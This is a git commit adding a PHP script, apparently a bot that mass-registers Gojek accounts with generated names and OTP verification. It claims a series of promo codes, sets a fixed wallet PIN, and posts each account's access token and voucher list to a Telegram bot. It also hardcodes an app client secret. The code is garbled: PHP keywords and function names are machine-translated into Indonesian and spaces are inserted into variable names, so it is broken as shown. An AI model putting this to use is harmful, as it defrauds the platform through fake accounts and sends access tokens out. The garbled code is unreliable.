be489ada3eb5cf834c89ea76b47f662dc593154d
sopowes <67716619+sopowes@users.noreply.github.com>
2020-07-02 09:45:58 +0700

    Create aris.php

---
+++ aris.php
@@ -0,0 +1,201 @@
+<? php
+date_default_timezone_set ('Asia / Jakarta');
+termasuk "function.php";
+ulang:
+// perubahan fungsi () {
+warna gema ("merah", "BANDIT VOCER \ n");
+warna gema ("putih", "Waktu:" .tanggal ('[dmY] [H: i: s]'). "\ n");
+warna gema ("putih", "Tidak Punah \ n");
+warna gema ("putih", "Format Kode 62 *** \ n");
+        $ nama = nama ();
+        $ email = str_replace ("", "", $ nama). mt_rand (100, 999);
+        warna gema ("putih", "NOMOR:");
+        // $ no = trim (fgets (STDIN));
+        $ nohp = trim (fgets (STDIN));
+        $ nohp = str_replace ("62", "62", $ nohp);
+        $ nohp = str_replace ("(", "", $ nohp);
+        $ nohp = str_replace (")", "", $ nohp);
+        $ nohp = str_replace ("-", "", $ nohp);
+        $ nohp = str_replace ("", "", $ nohp);
+
+        if (! preg_match ('/ [^ + 0-9] /', trim ($ nohp))) {
+            if (substr (trim ($ nohp), 0,3) == '62') {
+                $ hp = trim ($ nohp);
+            }
+            lain jika (substr (trim ($ nohp), 0,1) == '0') {
+                $ hp = '62'.substr (trim ($ nohp), 1);
+        }
+         elseif (substr (trim ($ nohp), 0, 2) == '62') {
+            $ hp = '6'.substr (trim ($ nohp), 1);
+        }
+        lain{
+            $ hp = '1'.substr (trim ($ nohp), 0,13);
+        }
+    }
+        $ data = '{"email": "'. $ email. '@ gmail.com", "name": "'. $ nama. '", "phone": "+'. $ hp. '", " signed_up_country ":" ID "} ';
+        $ register = request ("/ v5 / customers", null, $ data);
+        if (strpos ($ register, '"otp_token"')) {
+        $ otptoken = getStr ('"otp_token": "', '"', $ register);
+        warna gema ("putih", "KODE OTP .."). "\ n";
+        otp:
+        warna gema ("putih", "Otp:");
+        $ otp = trim (fgets (STDIN));
+        $ data1 = '{"client_name": "gojek: cons: android", "data": {"otp": "'. $ otp. '", "otp_token": "'. $ otptoken. '"}, " client_secret ":" 83415d06-ec4e-11e6-a41b-6c40088ab51e "} ';
+        $ verif = permintaan ("/ v5 / customers / phone / verifikasi", null, $ data1);
+        if (strpos ($ verif, '"access_token"')) {
+        warna gema ("putih", "BERHASIL MENDA berlangganan \ n");
+        $ token = getStr ('"access_token": "', '"', $ verif);
+        $ uuid = getStr ('"resource_owner_id":', ',', $ verif);
+        warna gema ("putih", "+] Token akses Anda:". $ token. "\ n \ n");
+        save ("token.txt", $ token); 
+        warna gema ("putih", "\ n▬▬▬▬▬▬▬▬▬▬▬▬CLAIM VOUCHER▬▬▬▬▬▬▬▬▬▬▬▬");
+        echo "\ n" .color ("white", "CLAIM A ..");
+        echo "\ n" .color ("white", "Silakan tunggu");
+        untuk ($ a = 1; $ a <= 3; $ a ++) {
+        warna gema ("putih", ".");
+        tidur (5);
+        }
+        $ code1 = permintaan ('/ go-promotion / v1 / promotion / pendaftaran', $ token, '{"promo_code": "EATLAH"}');
+        $ message = fetch_value ($ code1, '"message": "', '"');
+        if (strpos ($ code1, 'Promo kamu sudah bisa dipakai')) {
+        echo "\ n" .color ("green", "Message:". $ message);
+        goto gocar;
+        }lain{
+        echo "\ n" .color ("white", "Message:". $ message);
+	gocar:
+        echo "\ n" .color ("white", "CLAIM B ..");
+        echo "\ n" .color ("white", "Silakan tunggu");
+        untuk ($ a = 1; $ a <= 3; $ a ++) {
+        warna gema ("putih", ".");
+        tidur (35);
+        }
+        $ code1 = permintaan ('/ promosi-pergi / v1 / promosi / pendaftaran', $ token, '{"promo_code": "COBAGOFOOD2206"}');
+        $ message = fetch_value ($ code1, '"message": "', '"');
+        if (strpos ($ code1, 'Promo kamu sudah bisa dipakai.')) {
+        echo "\ n" .color ("green", "Message:". $ message);
+        goto gofood;
+        }lain{
+        echo "\ n" .color ("white", "Message:". $ message);
+        gofood:
+        echo "\ n" .color ("white", "CLAIM C ..");
+        echo "\ n" .color ("white", "Silakan tunggu");
+        untuk ($ a = 1; $ a <= 3; $ a ++) {
+        warna gema ("putih", ".");
+        tidur (3);
+        }
+        $ code1 = permintaan ('/ promosi-pergi / v1 / promosi / pendaftaran', $ token, '{"promo_code": "PESANGOFOOD2206"}');
+        $ message = fetch_value ($ code1, '"message": "', '"');
+        echo "\ n" .color ("white", "Message:". $ message);
+        echo "\ n" .color ("white", "VOCER COLI.");
+        echo "\ n" .color ("white", "Silakan tunggu");
+        untuk ($ a = 1; $ a <= 3; $ a ++) {
+        warna gema ("putih", ".");
+        tidur (3);
+        }
+        tidur (3);
+        $ boba09 = permintaan ('/ promosi-promosi / v1 / promosi / pendaftaran', $ token, '{"promo_code": "PAKEGOFOOD0906"}');
+        $ messageboba09 = fetch_value ($ boba09, '"message": "', '"');
+        echo "\ n" .color ("white", "Message:". $ messageboba09);
+        tidur (1);
+        $ cekvoucher = request ('/ gopoints / v3 / wallet / voucher? limit = 13 & halaman = 1', $ token);
+        $ total = fetch_value ($ cekvoucher, '"total_vouchers":', ',');
+        $ voucher1 = getStr1 ('"title": "', '",', $ cekvoucher, "1");
+        $ voucher2 = getStr1 ('"title": "', '",', $ cekvoucher, "2");
+        $ voucher3 = getStr1 ('"title": "', '",', $ cekvoucher, "3");
+        $ voucher4 = getStr1 ('"title": "', '",', $ cekvoucher, "4");
+        $ voucher5 = getStr1 ('"title": "', '",', $ cekvoucher, "5");
+        $ voucher6 = getStr1 ('"title": "', '",', $ cekvoucher, "6");
+        $ voucher7 = getStr1 ('"title": "', '",', $ cekvoucher, "7");
+        $ voucher8 = getStr1 ('"title": "', '",', $ cekvoucher, "8");
+        $ voucher9 = getStr1 ('"title": "', '",', $ cekvoucher, "9");
+        $ voucher10 = getStr1 ('"title": "', '",', $ cekvoucher, "10");
+        $ voucher11 = getStr1 ('"title": "', '",', $ cekvoucher, "11");
+        $ voucher12 = getStr1 ('"title": "', '",', $ cekvoucher, "12");
+        $ voucher13 = getStr1 ('"title": "', '",', $ cekvoucher, "13");
+        echo "\ n" .color ("white", "Total voucher". $ total. ":");
+        echo "\ n" .color ("white", "1.". $ voucher1);
+        echo "\ n" .color ("white", "2.". $ voucher2);
+        echo "\ n" .color ("white", "3.". $ voucher3);
+        echo "\ n" .color ("white", "4.". $ voucher4);
+        echo "\ n" .color ("white", "5.". $ voucher5);
+        echo "\ n" .color ("white", "6.". $ voucher6);
+        echo "\ n" .color ("white", "7.". $ voucher7);
+        echo "\ n" .color ("white", "8.". $ voucher8);
+        echo "\ n" .color ("white", "9.". $ voucher9);
+        echo "\ n" .color ("white", "10.". $ voucher10);
+	echo "\ n" .color ("white", "11.". $ voucher11);
+        echo "\ n" .color ("white", "12.". $ voucher12);
+        echo "\ n" .color ("white", "13.". $ voucher13);
+        gema "\ n";
+        $ expired1 = getStr1 ('"expiry_date": "', '"', $ cekvoucher, '1');
+        $ expired2 = getStr1 ('"expiry_date": "', '"', $ cekvoucher, '2');
+        $ expired3 = getStr1 ('"expiry_date": "', '"', $ cekvoucher, '3');
+        $ expired4 = getStr1 ('"expiry_date": "', '"', $ cekvoucher, '4');
+        $ expired5 = getStr1 ('"expiry_date": "', '"', $ cekvoucher, '5');
+        $ expired6 = getStr1 ('"expiry_date": "', '"', $ cekvoucher, '6');
+        $ expired7 = getStr1 ('"expiry_date": "', '"', $ cekvoucher, '7');
+        $ expired8 = getStr1 ('"expiry_date": "', '"', $ cekvoucher, '8');
+        $ expired9 = getStr1 ('"expiry_date": "', '"', $ cekvoucher, '9');
+        $ expired10 = getStr1 ('"expiry_date": "', '"', $ cekvoucher, '10 ');
+        $ expired11 = getStr1 ('"expiry_date": "', '"', $ cekvoucher, '11 ');
+        $ expired12 = getStr1 ('"expiry_date": "', '"', $ cekvoucher, '12 ');
+        $ expired13 = getStr1 ('"expiry_date": "', '"', $ cekvoucher, '13 ');
+        $ TOKEN = ":";
+	$ chatid = "";
+	$ pesan = "[+] Info Akun Gojek [+] \ n \ n". $ token. "\ n \ nTotalVoucher =". $ total. "\ n [+]". $ voucher1. "\ n [+] Exp: [". $ Expired1."] \ N [+] ". $ Voucher2." \ N [+] Exp: [". $ Expired2."] \ N [+] ". $ Voucher3." \ N [ +] Exp: [". $ Expired3."] \ N [+] ". $ Voucher4." \ N [+] Exp: [". $ Expired4."] \ N [+] ". $ Voucher5." \ n [+] Exp: [". $ expired5."] \ n [+] ". $ voucher6." \ n [+] Exp: [". $ expired6."] \ n [+] ". $ voucher7. "\ n [+] Exp: [". $ expired7. "] \ n [+]". $ voucher8. "\ n [+] Exp: [". $ expired8. "] \ n [+]". $ voucher9. "\ n [+] Exp: [". $ expired9. "] \ n [+]". $ voucher10. "\ n [+] Exp: [". $ expired10. "]". $ voucher11. " \ n [+] Exp: [". $ expired11."] \ n [+] ". $ voucher12."\ n [+] Exp: [". $ expired12. "] \ n [+]". $ voucher13. "\ n [+] Exp: [". $ expired13. "] \ n [+]";
+	$ method = "sendMessage";
+	$ url = "https://api.telegram.org/bot". $ TOKEN. "/". $ method;
+	$ post = [
+ 		'chat_id' => $ chatid,
+                'text' => $ pesan
+        	];
+                $ header = [
+                "X-Diminta-Dengan: XMLHttpRequest",
+                "Agen-Pengguna: Mozilla / 5.0 (X11; Linux x86_64) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 51.0.2704.84 Safari / 537.36" 
+                        ];
+                                        $ ch = curl_init ();
+                                        curl_setopt ($ ch, CURLOPT_RETURNTRANSFER, 1);
+                                        curl_setopt ($ ch, CURLOPT_URL, $ url);
+                                        curl_setopt ($ ch, CURLOPT_HTTPHEADER, $ header);
+                                        curl_setopt ($ ch, CURLOPT_POSTFIELDS, $ post);   
+                                        curl_setopt ($ ch, CURLOPT_SSL_VERIFYPEER, false);
+                                        $ data = curl_exec ($ ch);
+                                        $ error = curl_error ($ ch);
+                                        $ status = curl_getinfo ($ ch, CURLINFO_HTTP_CODE);
+                                        curl_close ($ ch);
+                                        $ debug ['text'] = $ pesan;
+                                        $ debug ['response'] = json_decode ($ data, true);
+         Setpin:
+         echo "\ n" .color ("white", "SETPIN .. !!!: y / n");
+         $ pilih1 = trim (fgets (STDIN));
+         if ($ pilih1 == "y" || $ pilih1 == "Y") {
+         // if ($ pilih1 == "y" && strpos ($ no, "628")) {
+         warna gema ("putih", "▬▬▬▬▬▬▬▬▬▬▬▬▬▬ PIN MU = 112233 ▬▬▬▬▬▬▬▬▬▬▬▬"). "\ n";
+         $ data2 = '{"pin": "112233"}';
+         $ getotpsetpin = request ("/ wallet / pin", $ token, $ data2, null, null, $ uuid);
+         gema "Otp pin:";
+         $ otpsetpin = trim (fgets (STDIN));
+         $ verifotpsetpin = request ("/ wallet / pin", $ token, $ data2, null, $ otpsetpin, $ uuid);
+         echo $ verifotpsetpin;
+         } lain jika ($ pilih1 == "n" || $ pilih1 == "N") {
+         mati();
+         }lain{
+         warna gema ("putih", "-] GAGAL !!! \ n");
+         }
+         }
+         }
+         }lain{
+         warna gema ("putih", "-] OTP SALAH");
+         gema "\ n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ \ n \ n";
+         warna gema ("putih", "!] INPUT ULANG .. \ n");
+         pergi otp;
+         }
+         }lain{
+         warna gema ("putih", "-] NOMOR SALAH");
+         gema "\ n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ \ n \ n";
+         warna gema ("putih", "!] MASUKAN LAGI \ n");
+         goto ulang;
+         }
+//}
+
+// gema perubahan (). "\ n";
